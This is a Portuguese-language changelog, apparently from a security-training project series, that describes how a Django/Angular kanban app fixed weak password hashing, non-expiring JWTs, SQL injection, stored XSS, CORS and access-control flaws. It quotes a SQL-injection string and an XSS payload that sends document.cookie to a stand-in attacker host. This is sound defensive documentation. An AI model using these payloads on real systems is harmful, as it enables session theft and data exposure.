# Projeto02 — Melhorias em relação ao [[Projeto01]]

Este documento cobre **só** o que melhorou de [[Projeto01]] para [[Projeto02]] — a
contrapartida de [[Projeto02/Vulnerabilidades]], que cobre o que continua (ou passou a
ser) explorável. A base de comparação é sempre o [[Projeto01]] (o único projeto anterior
ao [[Projeto02]]); nenhuma melhoria aqui é comparada com algo além dele, mesmo quando a
falha de origem está catalogada em [[Projeto00/Vulnerabilidades]] (o [[Projeto01]] a
herdou sem alteração, então a baseline efetiva de "antes" continua sendo o estado do
[[Projeto01]]).

---

## 1. Vulnerabilidades corrigidas

### Senha com hash MD5 sem salt (item 1 de [[Projeto01/Vulnerabilidades]])

**Corrigida.** O [[Projeto01/Backend|api01]] gravava `hash_md5(senha)`
(`usuarios/views.py:hash_md5`) — rápido de calcular e sem salt, revertível em
segundos/minutos via rainbow table/dicionário contra senhas comuns. O
[[Projeto02/Backend|api02]] substitui isso por
`django.contrib.auth.hashers.make_password()` no cadastro e `check_password()` no
login — PBKDF2 com salt único por senha e custo computacional deliberadamente alto, a
causa raiz que o MD5 deixava aberta. `hash_md5` foi removido do código; `Usuario.senha`
passou de `CharField(32)` para `CharField(255)` para acomodar o hash mais longo (migração
`0002_alter_usuario_senha_refreshtoken.py`).

**Ressalva**: contas criadas sob o [[Projeto01]] (hash MD5 de 32 caracteres) não são
reconhecidas por `check_password()` — `db.sqlite3` próprio do [[Projeto02]] não migra
hashes antigos automaticamente; contas assim precisam se recadastrar. Isso não é uma
vulnerabilidade, só uma consequência operacional da troca de algoritmo.

### Token JWT nunca expira (item 2 de [[Projeto01/Vulnerabilidades]])

**Corrigida.** `usuarios/jwt_utils.py:gerar_token` no [[Projeto01]] não incluía `exp`
no payload, e `verificar_token` nunca checava prazo — um token assinado continuava
válido para sempre. No [[Projeto02/Backend|api02]], `gerar_token()` grava `iat` e
`exp = iat + ACCESS_TOKEN_TTL_SEGUNDOS` (15 minutos), e `verificar_token()` rejeita
(`ValueError`) qualquer token sem `exp` ou com `exp` já passado — convertido em `401`
por `jwt_required`. A continuidade da sessão, sem reautenticação manual a cada 15
minutos, passa a depender do refresh token (ver seção 2, hardening).

### JWT guardado no `localStorage` e decodificado sem verificar assinatura (item 3 de [[Projeto01/Vulnerabilidades]])

**Corrigida.** O [[Projeto01/Frontend|client01]] guardava o JWT em
`localStorage` (chave `auth_token`) — legível por qualquer JavaScript da página,
inclusive um XSS, e sem expiração (item 2, acima) servia de credencial permanente para
quem o lesse. O [[Projeto02/Frontend|client02]] não persiste o access token em nenhum
*storage* do browser nem o mantém em memória: tanto ele quanto o refresh token são
entregues só em cookies `HttpOnly` setados pelo backend (`access_token`/`refresh_token`
— `usuarios/views.py:_definir_cookie_access`/`_definir_cookie_refresh`), inacessíveis a
qualquer JavaScript do frontend, inclusive um XSS. `AuthService` não lê, decodifica nem
anexa manualmente nenhum token; o navegador envia os cookies automaticamente
(`withCredentials: true`) em toda requisição para `/api`, e os dados exibidos na UI
(nome, papel) vêm de um JSON que o próprio backend já devolve validado — nas respostas
de `/login`, `/token/refresh` e `GET /usuarios/me` — nunca de um payload de JWT
decodificado no cliente sem checar assinatura. Ver item de hardening abaixo para o
efeito disso sobre o escopo da proteção CSRF.

### Broken Access Control — listagem de usuários sem checar papel (item 5 de [[Projeto01/Vulnerabilidades]])

**Corrigida.** `usuarios/views.py:listar_usuarios` no [[Projeto01]] exigia só
`@jwt_required` — qualquer usuário autenticado, de qualquer papel, lia a lista completa
de usuários cadastrados. O [[Projeto02/Backend|api02]] adiciona
`@papel_required(Usuario.PAPEL_ADMIN)` (empilhado com `jwt_required` por cima, para que
`request.usuario` já exista quando o papel é checado) — chamar a rota com um token de
papel `usuario`/`gerente` agora devolve `403`. O guia
[[Projeto01/Ataque-A01-ListagemUsuariosSemChecarPapel]] **não funciona mais** contra o
[[Projeto02/Backend|api02]].

### SQL Injection no filtro de tarefas (item 4 de [[Projeto01/Vulnerabilidades]])

**Corrigida.** `tarefas/views.py:listar_tarefas_por_usuario` no [[Projeto01]] montava a
consulta por f-string (`f"... WHERE usuario_id = {usuario_id} AND nome LIKE
'%{nome_filtro}%'"`) e executava via `connection.cursor()` — um valor como
`' OR '1'='1' --` no parâmetro `nome` quebrava a cláusula `WHERE` e vazava tarefas de
qualquer usuário. O [[Projeto02/Backend|api02]] substitui a query crua por
`Tarefa.objects.filter(usuario_id=usuario_id, nome__icontains=nome_filtro)` — o ORM do
Django sempre parametriza os valores passados a `filter()`, então o termo buscado nunca
é interpretado como SQL, só como dado (testado com o mesmo payload: a consulta retorna
lista vazia em vez de vazar tarefas de outros usuários). O guia
[[Projeto01/Ataque-A05-SQLInjectionFiltro]] **não funciona mais** contra o
[[Projeto02/Backend|api02]].

### XSS armazenado na descrição da tarefa (item 10 de [[Projeto00/Vulnerabilidades]], herdado sem alteração até o [[Projeto01]])

**Corrigida.** Desde o [[Projeto00]], `kanban.component.ts`/`.html` desligavam o
sanitizador padrão do Angular para a descrição da tarefa
(`sanitizer.bypassSecurityTrustHtml(tarefa.descricao)`, renderizada via
`[innerHTML]="descricaoHtml(tarefa)"`) — uma descrição como
`<img src=x onerror="fetch('https://atacante/?c='+document.cookie)">` era salva como
texto puro pelo backend (sem nenhuma sanitização em `tarefas/views.py`) e executada no
navegador de quem visualizasse o card. O [[Projeto02/Frontend|client02]] remove o
método `descricaoHtml()`, o `DomSanitizer` injetado e o `[innerHTML]`, voltando a
descrição para um binding de texto comum (`{{ tarefa.descricao }}`) — a interpolação
padrão do Angular escapa HTML automaticamente, então a mesma entrada passa a ser
exibida como texto literal, nunca executada. O guia
[[Projeto00/Ataque-A05-StoredXSS]] **não funciona mais** contra o
[[Projeto02/Frontend|client02]].

### CORS liberado para qualquer origem (item 6 de [[Projeto00/Vulnerabilidades]], herdado sem alteração até o [[Projeto01]])

**Corrigida.** `CORS_ALLOW_ALL_ORIGINS = True` vinha sem alteração desde o [[Projeto00]]
— confirmado como "herdado sem alteração" no resumo de
[[Projeto01/Vulnerabilidades]]. O [[Projeto02/Backend|api02]] troca isso por
`CORS_ALLOWED_ORIGINS = ['http://localhost:4200']` + `CORS_ALLOW_CREDENTIALS = True` —
mudança que, inclusive, era **obrigatória** para o cookie do refresh token funcionar
(browsers recusam enviar credenciais numa resposta CORS com origem `*`), não só uma
correção isolada de hardening.

---

## 2. Hardening e qualidade (sem ser correção direta de um item numerado)

- **Refresh token revogável e rotacionado** (`usuarios/models.py:RefreshToken`,
  `usuarios/refresh_utils.py`, novos): o [[Projeto01]] não tinha nenhum mecanismo de
  revogação — um JWT stateless, uma vez emitido (e, pior, nunca expirando), não podia
  ser invalidado antes do prazo. Agora existe uma credencial de sessão persistida e
  revogável a qualquer momento (logout, rotação a cada uso, ou em massa por suspeita de
  reuso — ver `rotacionar_refresh_token`).
- **`papel_required`** (`usuarios/decorators.py`, novo): generaliza a checagem de papel
  como decorator reutilizável, em vez de uma condicional ad-hoc dentro da view — já usado
  em `listar_usuarios` (item corrigido, seção 1) e disponível para qualquer rota futura
  que precise restringir por papel.
- **`JWT_SECRET_KEY` independente do `SECRET_KEY`** (`settings.py`): o [[Projeto01]]
  reusava a `SECRET_KEY` do Django (já insegura e commitada, item 7 de
  [[Projeto00/Vulnerabilidades]]) para assinar JWTs — um vazamento por qualquer uso do
  Django daquela chave comprometeria também a integridade dos tokens. Agora são chaves
  separadas; o fallback de desenvolvimento do `JWT_SECRET_KEY` continua hardcoded no
  código (mesma limitação do item 7, só que isolada a um uso só), mas o acoplamento
  indevido entre os dois usos foi eliminado.
- **Access token movido para cookie `HttpOnly`, com `CsrfViewMiddleware` passando a
  cobrir toda rota autenticada por cookie** (`usuarios/decorators.py:jwt_required`,
  `usuarios/views.py`, `tarefas/views.py`): numa primeira versão deste projeto, o access
  token ainda era devolvido no corpo da resposta de `/login`/`/token/refresh` para o
  frontend guardar em memória e reenviar manualmente no header `Authorization` (era essa
  a forma, na época, de fechar o item 3 acima em relação só ao `localStorage` do
  [[Projeto01]]). Nesta versão, `jwt_required` passa a ler o access token do cookie
  `access_token` — não mais do header —, e `/login`/`/token/refresh` passam a devolver
  só os dados do usuário no corpo, nunca o token (nem um script injetado por XSS, nem a
  aba de rede do navegador, expõem mais o token via JavaScript). Como consequência
  direta, toda rota que dependia de `@jwt_required` (as de `tarefas`, `/usuarios/me`,
  `listar_usuarios`) passa a autenticar por cookie — então o `@csrf_exempt` que elas
  tinham (válido só enquanto autenticavam por header, não por cookie) foi removido, e
  passam a exigir `X-XSRF-TOKEN` como `/token/refresh`/`/logout` já exigiam. `login` e o
  `POST` de cadastro continuam isentos, de propósito, por não lerem nenhum cookie de
  autenticação.
- **Proxy do dev server para o `HttpXsrfInterceptor` do Angular funcionar**
  (`client02/proxy.conf.json`, novo; `angular.json:serve.options.proxyConfig`;
  `api.config.ts:API_BASE_URL` agora `/api`, antes `http://localhost:8000/api`): o
  interceptor nativo de XSRF do Angular só anexa o header `X-XSRF-TOKEN`
  automaticamente quando a URL da requisição é da **mesma origem** da página — para uma
  URL absoluta de outra origem (como era `http://localhost:8000/api`, visto a partir de
  `http://localhost:4200`), ele se recusa a mandar o token, por segurança (evita vazar o
  CSRF token para um host de terceiros). Isso fazia `/token/refresh`/`/logout` falharem
  com "CSRF token missing" mesmo com cookie e nomes de header corretos. O dev server do
  Angular agora faz proxy de `/api` para `http://localhost:8000`, e o frontend chama só
  `/api/...` — a página passa a "ver" a chamada como mesma origem, e o interceptor volta
  a anexar o header normalmente, sem abrir mão de nenhuma configuração de CSRF existente.
- **Interceptor sem anexar token manualmente; `withCredentials` + retry automático em
  401** (`client02/.../auth.interceptor.ts`, reescrito): o interceptor do [[Projeto01]]
  anexava `Authorization: Bearer <token>` lido do `localStorage`. Nesta versão, ele não
  anexa mais nenhum header de autenticação — o access token já vai sozinho, via cookie
  `HttpOnly` (item acima) — e só garante `withCredentials: true` para que os cookies de
  access/refresh/CSRF trafeguem entre `localhost:4200` e `localhost:8000`. Ao receber
  `401` (access token expirado), chama o refresh e repete a requisição original uma
  única vez — sem isso, a vida curta do access token (15 min) deslogaria o usuário com
  muita frequência.
- **`APP_INITIALIZER` para restaurar sessão no boot do app** (`app.config.ts`, novo):
  evita a corrida entre o reload de página (que perde todo estado em memória do
  `AuthService`, já que nada é persistido) e o `ngOnInit` de componentes de rota, que
  antes rodariam achando que não havia sessão.
- **`CORS_ALLOW_HEADERS` estendido com `x-xsrf-token`** (`settings.py`): necessário para
  o preflight CORS do browser aceitar o header que o Angular de fato envia — sem isso, o
  fluxo de CSRF funcionaria em testes diretos de API (sem preflight), mas falharia no
  browser real.
- **Preview de link na tarefa, protegido contra SSRF desde a primeira versão**
  (`tarefas/link_preview.py`, novo): esta é uma funcionalidade nova, não existia no
  [[Projeto01]] — por isso não entra na seção 1 (não há nada para "corrigir"), mas é
  hardening relevante porque é o tipo de recurso (buscar uma URL informada pelo usuário)
  que costuma ser introduzido de forma vulnerável a SSRF. Aqui nasce com allowlist de
  esquema, validação de IP público (bloqueando loopback/privado/link-local, o que cobre
  o endereço de metadados de nuvem `169.254.169.254`), conexão fixada no IP já validado
  (evita DNS rebinding), revalidação de redirecionamentos e limites de tempo/tamanho.
  Ver [[Projeto02/Backend]] (seção "Preview de link na tarefa").

---

## Resumo

| # | Melhoria | Categoria | Item correspondente em [[Projeto02/Vulnerabilidades]] |
|---|---|---|---|
| 1 | Senha MD5 sem salt → PBKDF2 com salt (`make_password`/`check_password`) | Vulnerabilidade corrigida | — (totalmente resolvido) |
| 2 | JWT passa a ter `exp`, validado em toda requisição | Vulnerabilidade corrigida | — (totalmente resolvido) |
| 3 | Token sai do `localStorage`; access token e refresh token passam a viver só em cookies `HttpOnly` (nunca em memória, nunca decodificados no cliente) | Vulnerabilidade corrigida | — (totalmente resolvido) |
| 4 | `GET /api/usuarios` exige papel admin no backend (`papel_required`) | Vulnerabilidade corrigida | — (totalmente resolvido) |
| 5 | CORS restrito a `http://localhost:4200` com credenciais | Vulnerabilidade corrigida (origem: [[Projeto00/Vulnerabilidades]] item 6) | — (totalmente resolvido) |
| 6 | SQL Injection no filtro de tarefas → `Tarefa.objects.filter(nome__icontains=...)` (ORM parametrizado) | Vulnerabilidade corrigida (origem: [[Projeto01/Vulnerabilidades]] item 4) | — (totalmente resolvido) |
| 7 | XSS armazenado na descrição da tarefa → remoção do `bypassSecurityTrustHtml`/`[innerHTML]` | Vulnerabilidade corrigida (origem: [[Projeto00/Vulnerabilidades]] item 10) | — (totalmente resolvido) |
| 8 | Refresh token revogável, rotacionado, com detecção de reuso | Hardening/qualidade | — |
| 9 | `papel_required` como decorator reutilizável | Hardening/qualidade | — |
| 10 | `JWT_SECRET_KEY` separado do `SECRET_KEY` do Django | Hardening/qualidade | — (fallback de dev ainda hardcoded, mesma limitação residual do item 7 de [[Projeto00/Vulnerabilidades]]) |
| 11 | Access token movido para cookie `HttpOnly`; `CsrfViewMiddleware` passa a cobrir toda rota autenticada por cookie (tarefas, `/usuarios/me`, `listar_usuarios`), não só `/token/refresh`/`/logout` | Hardening/qualidade | — |
| 12 | Proxy do dev server (`client02` → `/api`) para o `HttpXsrfInterceptor` do Angular anexar `X-XSRF-TOKEN` em chamadas que antes eram cross-origin | Hardening/qualidade | — |
| 13 | Interceptor sem anexar token manualmente (access token já vai no cookie); retry automático em 401 | Hardening/qualidade | — |
| 14 | `APP_INITIALIZER` de restauração de sessão no boot do app | Hardening/qualidade | — |
| 15 | `CORS_ALLOW_HEADERS` estendido com `x-xsrf-token` | Hardening/qualidade | — |
| 16 | Preview de link na tarefa, com defesas contra SSRF desde a primeira versão (`tarefas/link_preview.py`) | Funcionalidade nova, construída com hardening (não corrige nada pré-existente) | — |

Nenhuma destas comparações se estende a projetos anteriores ao [[Projeto01]] — mesmo
quando a falha de origem está catalogada em [[Projeto00/Vulnerabilidades]], a baseline de
"antes" usada aqui é sempre o estado em que o [[Projeto01]] a deixou.
